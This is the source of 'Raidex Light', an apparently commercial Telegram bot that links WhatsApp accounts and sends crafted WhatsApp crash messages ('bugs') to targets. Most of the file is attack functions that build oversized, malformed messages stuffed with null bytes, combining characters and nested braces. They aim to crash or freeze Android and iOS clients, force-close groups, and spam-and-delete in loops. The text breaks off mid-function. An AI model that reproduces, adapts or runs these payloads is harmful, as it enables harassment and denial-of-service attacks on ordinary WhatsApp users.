const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("xatabail");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const REPOSITORY = "VorzaOfficial/Database";
const cd = "cooldown.json";
const axios = require("axios");
const chalk = require("chalk");
const config = require("./settings/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  `https://raw.githubusercontent.com/${REPOSITORY}/refs/heads/main/tokens.json`;
const SYSTEM_URL = 
  "https://raw.githubusercontent.com/VorzaOfficial/Maintenance/refs/heads/main/maintenance.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("════════════════════════════════════════════════════════"));
    console.log(chalk.red("Wops Ngapain lu anjeng?!\nToken lu ga terdaftar idiot!!"));
    console.log(chalk.red("════════════════════════════════════════════════════════"));
    process.exit(1);
  }
  console.log(chalk.green(`✅ Token telah di terima, gunakan bot dengan sebaik mungkin.`));
  startBot();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
██████╗  █████╗ ██╗██████╗ ███████╗██╗  ██╗
██╔══██╗██╔══██╗██║██╔══██╗██╔════╝╚██╗██╔╝
██████╔╝███████║██║██║  ██║█████╗   ╚███╔╝ 
██╔══██╗██╔══██║██║██║  ██║██╔══╝   ██╔██╗ 
██║  ██║██║  ██║██║██████╔╝███████╗██╔╝ ██╗
`));

console.log(chalk.greenBright(`
Script : Raidex Light
Version : 5.0
Type Script : Bebas Spam Bugs
Owner : @VorzaOffc
`));

console.log(chalk.blueBright(`
Server : ✅ Connected
`
));
};

validateToken();

let sock;

const FOLLOW_CHANNEL = [
   "120363425022810478@newsletter", 
   "120363424742012663@newsletter"
];

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
            sock.newsletterFollow("120363425022810478@newsletter");
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
⌛ Proses Pairing

#- Information Number
Number : *${botNumber}*
Status ♻️ Proses Menghubungkan.. 
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
⌛ Proses Pairing

#- Information Number
Number : *${botNumber}*
Status ♻️ Proses.. 
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
🚫 Gagal

#- Information Number
Number : *${botNumber}*
Status : ❌ Gagal Menghubungkan
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
    sock.newsletterFollow("120363425022810478@newsletter");
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
✅ Succes Pairing

#- Information Number
Number : *${botNumber}*
Status : ✅ *Succes*
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber, "RAIDEXV5");
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
⌛ Proses Pairing

#- Information Number
Number : *${botNumber}*
Status : Pairing Code.. 
Code : \`${formattedCode}\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/38xopo.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /setjeda 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

// Pasang Function Kamu
async function Cloreds(sock, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 111.111111,
      degreesLongitude: -99.9999,
      name: "X" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: null,
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "X" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  console.log(randomColor()(`Success Send ${target}`))
}

async function TrueNullV9(sock, target) {
  try {
    const generateBroadcastMsg = await generateWAMessageFromContent(
      "status@broadcast",
      {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "X", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(1000000),
                version: 3
              }
            }
          }
        }
      },
      {}
    );

    await sock.relayMessage(
      "status@broadcast",
      generateBroadcastMsg.message,
      {
        messageId: generateBroadcastMsg.key.id,
        statusJidList: [target]
      }
    );

    const viewOnceMsg = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "X", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(150000),
              version: 3
            },
            contextInfo: {
              mentionedJid: Array.from(
                { length: 1950 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "91@s.whatsapp.net"
              ),
              isForwarded: true,
              forwardingScore: 999,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "1@newsletter",
                serverMessageId: 1,
                newsletterName: "Message"
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(
      "status@broadcast",
      viewOnceMsg,
      {
        messageId: generateBroadcastMsg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target } }]
              }
            ]
          }
        ]
      }
    );
  } catch (err) {}

  const X_Mention = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " X ",
              mentionedJid: ["13135559098@s.whatsapp.net"]
            },
            body: {
              text: "X",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"X","address":"2.7205","tower_number":"507","city":"X","name":"X","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: X_Mention.message
      }
    },
    {
      messageId: X_Mention.key.id,
      participant: { jid: target }
    }
  );

  await new Promise(resolve => setTimeout(resolve, 1000));
}

async function TrueNullV10(target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: null,
            format: null
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request", 
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          groupStatusMessageV2: null
        }
      }
    }
  }, { participant: { jid: target }});
}

async function PaymentFC(sock, target) {
    const requestPaymentMsg = {
        requestPaymentMessage: {
            amount: {
                value: 2,
                offset: 1,
                currencyCodeIso4217: "IDR",
                requestFrom: target,
                caption: "I'm Vorza",
                showAdAttribution: false,
                expiryTimestamp: Date.now() + 1000
            },
            contextInfo: {
                forwardingScore: 9999,
                isForwarded: true,
                remoteJid: "status@broadcast",
                externalAdReply: {
                    title: "ʀᴀɪᴅᴇx ʟɪɢʜᴛ",
                    body: "",
                    mimetype: "audio/mpeg",
                    caption: "",
                    sourceUrl: "https://tiktok.com/vorzaoffc"
                }
            }
        }
    };

    await sock.relayMessage(target, requestPaymentMsg, {
        participant: { jid: target },
        userJid: target,
        messageId: null,
        quoted: null
    });
}

async function Candydelay(sock, target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝙍𝙖𝙞𝙙𝙚𝙭 𝙇𝙞𝙜𝙝𝙩 </🦠>",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1_000_000),
              version: 3
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    {
      messageId: msg.key.id,
      participant: { jid: target }
    }
  );
}

async function NullinvisDozer(sock, target) {
  try {
    const messageContent = {
      eventMessage: {
        isCanceled: false,
        name: "ꋪꋬ꒐꒯ꏂꉧ" + "ꦾ".repeat(25000) + "ꦽ".repeat(25000) + "\u2080".repeat(175000) + "\0".repeat(2500),
        description: "{".repeat(5000),
        
        location: {
          LocationMessage: {
            degreesLatitude: 0,
            degreesLongitude: 0,
            name: "ᴠᴏʀᴢᴀ ɪ'ᴍ ᴄᴏᴍᴍɪɴɢ" + "ꦾ".repeat(25000) + "ꦽ".repeat(25000) + "\u2080".repeat(175000),
            address: "ʀᴀɪᴅᴇx ʟɪɢʜᴛ" + "ꦾ".repeat(25000) + "ꦽ".repeat(25000) + "\u2080".repeat(175000)
          }
        },
        
        joinLink: "wa.me/settings",
        startTime: 0,
        endTime: 0,
        extraGuestsAllowed: true,
        isScheduleCall: false,
        hasReminder: false,
        reminderOffsetSec: 0
      }
    };

    await sock.relayMessage(target, messageContent, { messageId: null });
    
  } catch (err) {
    console.error(err);
  }
}

async function AndroXUI(sock, target) {
    return await sock.sendMessage(
        target,
        {
            text: "Ŕaidex Łight" + "ꦾ".repeat(50000),
            contextInfo: {
                stanzaId: `${Date.now()}`,
                participant: "0@s.whatsapp.net",
                quotedMessage: {
                    extendedTextMessage: {
                        text: "Ŕaidex Łight" + "ꦾ".repeat(50000),
                        previewType: "NONE",
                        inviteLinkGroupTypeV2: "DEFAULT"
                    }
                },
                forwardingScore: 1,
                isForwarded: true,
                externalAdReply: {
                    title: "Ŕaidex Łight" + "ꦾ".repeat(50000),
                    body: "Ŕaidex Łight" + "ꦾ".repeat(50000),
                    thumbnailUrl: "",
                    sourceUrl: "",
                    showAdAttribution: false
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "0@newsletter",
                    newsletterName: "Ŕaidex Łight" + "\u0000".repeat(1750)
                }
            }
        }
    )
}

async function iosCrashNew(sock, target) {
  await sock.sendMessage(target, {
    productMessage: {
      title: "Raidex Crash Message",
      description: "𝘾𝙧𝙖𝙨𝙝 𝘼𝙣𝙙𝙧𝙤" + "𑇂𑆵𑆴𑆿".repeat(60000),
      thumbnail: { url: "" },
      productId: "0",
      retailerId: "0",
      url: "https://" + "I'm Vorza" + ".".repeat(15000) + ".id",
      body: "Vorza Official" + "𑇂𑆵𑆴𑆿".repeat(1000),
      footer: "Tiktok > tiktok.com/VorzaOffc",
      contextInfo: {
        remoteJid: "0@s.whatsapp.net",
        mentionedJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        forwardingScore: 9999,
        isForwarded: true,
        businessMessageForwardInfo: {
          businessOwnerJid: "0@s.whatsapp.net"
        },
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\u0025".repeat(100000),
          greetingMessageBody: "\u0025",
        }
      },
      priceAmount1000: 50000,
      currencyCode: "USD"
    }
  });

  await sock.sendMessage(target, {
    protocolMessage: {
      type: 0,
      key: {
        id: "",
        remoteJid: "",
        fromMe: false
      },
      historySyncNotification: {
        fileSha256: Buffer.from("\u0000".repeat(64), "utf8"),
        fileLength: 999999999,
        mediaKey: Buffer.from("\u0000".repeat(32), "utf8"),
        fileEncSha256: Buffer.from("\u0000".repeat(64), "utf8"),
        directPath: "\u0000".repeat(50000),
        syncType: 0
      }
    }
  });
}


// Function Group
async function groupUiCrash(target) {
  try {
    const jid = target.includes("@g.us")
      ? target
      : target.replace(/@.+$/, "@g.us");
      
    const extendedTextMsg = {
      extendedTextMessage: {
        text: "Raidex Killed Group" + "ꦾ".repeat(25000),
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          mentionedJid: ["13135550002@s.whatsapp.net"],
          externalAdReply: {
            title: null,
            body: null,
            thumbnailUrl: "https://wa.settings/" + "...".repeat(25000),
            sourceUrl: "https://t.me/VorzaOffc/" + "...".repeat(25000),
            mediaType: 1,
            renderLargerThumbnail: false,
            showAdAttribution: false
          }
        },
        nativeFlowMessage: {
          messageParamsJson: "{}",
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}"
              }, 
              {
              name: "template_message",
              buttonParamsJson: "{}"
            }
          ]
        }
      }
    };

    await sock.relayMessage(jid, extendedTextMsg, {
      participant: { jid: jid }
    });
  } catch (err) {
  }
}

async function GroupFC(sock, target) {
  const jid = target.includes("@g.us")
    ? target
    : target.replace(/@.+$/, "@g.us");
    
  const paymentRequestMsg = {
    requestPaymentMessage: {
      amount: {
        value: 1,
        offset: 0,
        currencyCodeIso4217: "IDR",
        requestFrom: jid,
        expiryTimestamp: Date.now()
      },
      contextInfo: {
        externalAdReply: {
          title: null,
          body: null,
          mimetype: "audio/mpeg",
          caption: "ForceClose By Raidex",
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null
        }
      }
    }
  };

  const eventMsg = {
    message: {
      messageContextInfo: {
        messageSecret: "Am4stQptHeQ48LWeK7w6B5SQRUam97ggMwQIVpk2PKk="
      },
      eventMessage: {
        isCanceled: false,
        name: "𝙑𝙤𝙧𝙯𝙖 𝙁𝙤𝙧𝙘𝙚𝘾𝙡𝙤𝙨𝙚",
        location: {
          degreesLatitude: 176657255,
          degreesLongitude: -33972660,
          name: ""
        },
        startTime: "0",
        extraGuestsAllowed: true,
        isScheduleCall: false
      }
    }
  };

  await sock.relayMessage(
    jid,
    paymentRequestMsg,
    eventMsg,
    { messageId: null }
  );
}

async function ExploitDelayV1(sock, target) {
  for (let i = 0; i < 100; i++) {
    const push = [];
    const buttons = [];

    for (let j = 0; j < 50; j++) {
      buttons.push({
        name: 'galaxy_message',
        buttonParamsJson: JSON.stringify({
          header: 'null',
          body: 'xxx',
          flow_action: 'navigate',
          flow_action_payload: { screen: 'FORM_SCREEN' },
          flow_cta: 'Grattler',
          flow_id: '1169834181134583',
          flow_message_version: '3',
          flow_token: 'AQAAAAACS5FpgQ_cAAAAAE0QI3s',
        }),
      });
    }

    for (let k = 0; k < 10; k++) {
      push.push({
        body: { text: '𖣂᳟᪳' },
        footer: { text: '' },
        header: {
          title: 'X ',
          hasMediaAttachment: true,
          imageMessage: {
            url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc',
            mimetype: 'image/jpeg',
            fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
            fileLength: '591',
            height: 0,
            width: 0,
            mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
            fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
            directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc',
            mediaKeyTimestamp: '1721344123'
          },
        },
        nativeFlowMessage: { buttons },
      });
    }

    const synxtax = generateWAMessageFromContent(
      target,
      {
        interactiveMessage: {
          body: { text: '\u0000' },
          footer: { text: '𝙑𝙤𝙧𝙯𝙖𝙊𝙛𝙛𝙞𝙘𝙖𝙡᪳' },
          synxtaxMessage: { cards: push },
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(
      target,
      { groupStatusMessageV2: { message: synxtax.message } },
      {
        messageId: synxtax.key.id,
        participant: { jid: target },
      }
    );
  }
  let Msgx = {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from(
          { length: 2000 },
          (_, i) => `628${i + 72}@s.whatsapp.net`
        ),
        isForwarded: true,
        forwardingScore: 7205,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "1@newsletter",
          newsletterName: null,
          serverMessageId: 100,
          accessibilityText: null
        },
        statusAttributionType: "RESHARED_FROM_MENTION",
        contactVcard: true,
        isSampled: true,
        dissapearingMode: {
          initiator: target,
          initiatedByMe: true
        },
        expiration: Date.now()
      },
      body: {
        text: null,
        format: null
      },
      nativeFlowResponseMessage: {
        name: "call_permission_request",
        paramsJson: "\x10".repeat(1000000),
        version: 3
      }
    }
  };

  let msg = generateWAMessageFromContent(
    target,
    { groupStatusMessageV2: { message: Msgx } },
    {}
  );

  await sock.relayMessage(
    target,
    msg.message,
    { messageId: msg.key.id }
  );

  await sock.sendMessage(target, {
    delete: {
      remoteJid: target,
      fromMe: true,
      id: msg.key.id,
    }
  });
}

async function ZInvisF(sock, target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      ephemeralMessage: {
        message: {
          noteMessage: {
            extendedTextMessage: {
              text: null,
              matchedText: null,
              description: null,
              title: null,
              paymentLinkMetadata: {
                button: { displayText: "\x30" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(70000) }
              }
            }
          }
        }
      }
    },
    {}
  )

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    {
      messageId: null,
      participant: { jid: target }
    }
  )
}

async function SpamInvis(target) {
  const head = {
    extendedTextMessage: {
      text: null,
      matchedText: null,
      description: null,
      title: null,
      paymentLinkMetadata: {
        button: { displayText: "-- Vorza Official" },
        header: { headerType: 1 },
        provider: { paramsJson: "{{".repeat(10000) },
      },
      linkPreviewMetadata: {
        paymentLinkMetadata: {
          button: { displayText: "-- Raidex Light" },
          header: { headerType: 1 },
          provider: { paramsJson: "{{".repeat(10000) },
        },
        urlMetadata: { fbExperimentId: 999 },
        fbExperimentId: 888,
        linkMediaDuration: 555,
        socialMediaPostType: 1221,
      },
    },
  };

  const x = {
    groupStatusMessageV2: {
      message: head,
    },
  };

  const msg = generateWAMessageFromContent(target, x, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
    userJid: target,
  });

  setTimeout(async () => {
  await sock.sendMessage(target, {
    delete: {
      remoteJid: target,
      fromMe: true,
      id: msg.key.id,
      participant: target
    }
  });
});
}

async function SpamInvisgb(sock, target) {
  const jid = target.includes("@g.us")
    ? target
    : target.replace(/@.+$/, "@g.us");

  const head = {
    extendedTextMessage: {
      text: "",
      matchedText: "Wa.me/stickerpack/X",
      description: null,
      title: null,
      paymentLinkMetadata: {
        button: { displayText: " X" },
        header: { headerType: 1 },
        provider: { paramsJson: "{{".repeat(10000) },
      },
      linkPreviewMetadata: {
        paymentLinkMetadata: {
          button: { displayText: "X" },
          header: { headerType: 1 },
          provider: { paramsJson: "{{".repeat(10000) },
        },
        urlMetadata: { fbExperimentId: 999 },
        fbExperimentId: 888,
        linkMediaDuration: 555,
        socialMediaPostType: 1221,
      },
    },
  };
  const x = jid.endsWith("@g.us")
    ? head
    : {
        groupStatusMessageV2: {
          message: head,
        },
      };

  for (let i = 0; i < 100; i++) {
    const msg = generateWAMessageFromContent(jid, x, {});

    await sock.relayMessage(jid, msg.message, {
      messageId: msg.key.id,
    });

    await sock.sendMessage(jid, {
      delete: {
        remoteJid: jid,
        fromMe: true,
        id: msg.key.id,
        participant: jid.endsWith("@g.us") ? undefined : jid,
      },
    });
  }
}

async function nullbulldozer(sock, target) {
  const messages = generateWAMessageFromContent(
    "status@broadcast",
    {
      productMessage: {
        product: {
          productImage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m237/AQPIYikiwi3m6cnqci3YWcDdEXK4pRdEoVuffum6NfmIgZS-w1l3p8hAUz650_FFQNJa0iCUOIRAEXUEi3_lrzuZXctdJEyYxC2eS0afzg?ccb=9-4&oh=01_Q5Aa3QGSiEmJ9tDlRgHnGNJx3KCFYCdyhmkeaq3eHDd1YLRxtw&oe=69631B8B&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: Buffer.from("T+i083KjdABcBnJBzbB8paMZoMyNxT3rc+8FUOb4Qtg=", "base64"),
            fileLength: "38617",
            height: 128000000,
            width: 7200000000,
            mediaKey: Buffer.from("zi+b43DCleFrEbpS7EOYN1eKcRykOKDmUmDj3ISXvZI=", "base64"),
            fileEncSha256: Buffer.from("54hPlvNm6Nk1roPnpQGvfvCu8JYb4wLalZ0FZay7Src=", "base64"),
